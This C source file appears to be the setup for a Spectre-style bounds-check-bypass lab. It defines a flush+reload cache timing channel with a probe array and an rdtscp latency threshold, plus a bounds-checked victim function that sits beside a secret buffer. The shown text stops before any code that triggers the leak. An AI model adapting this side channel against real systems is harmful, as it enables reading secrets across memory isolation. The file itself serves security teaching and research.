#include <stdio.h>
#include <stdint.h>
#include <ctype.h>

#include <x86intrin.h>

#include <mastik/util.h>


#define PAGE (4096/sizeof(uint32_t))
#define THRESHOLD 100


uint8_t public[] = "Public message";
uint8_t secret[1024] = "Secret";
uint32_t probe_array[256 * PAGE] = {1};
uint8_t space1[512]={1};
int public_len = sizeof(public);
uint8_t space2[512]={1};



void cc_setup() {
  for (int i = 0; i < 256; i++)
    _mm_clflush(probe_array + i * PAGE);
  _mm_mfence();
}

void cc_transmit(int value) {
  if (value < 0)
    return;
  volatile uint32_t *ptr = probe_array + value * PAGE;
  uint32_t t = *ptr;
}

int cc_receive() {
  int junk = 0;
  _mm_mfence();

  for (int i = 0; i < 256; i++) {
    volatile uint32_t *ptr = probe_array + i * PAGE;
    uint64_t start = __rdtscp(&junk);
    uint32_t v = *ptr;
    uint64_t latency = __rdtscp(&junk) - start;

    if (latency < THRESHOLD) 
      return i;
  }
  return -1;
}



int victim(uint64_t index) {
  if (index >= public_len)
    return -1;
  return public[index];
}

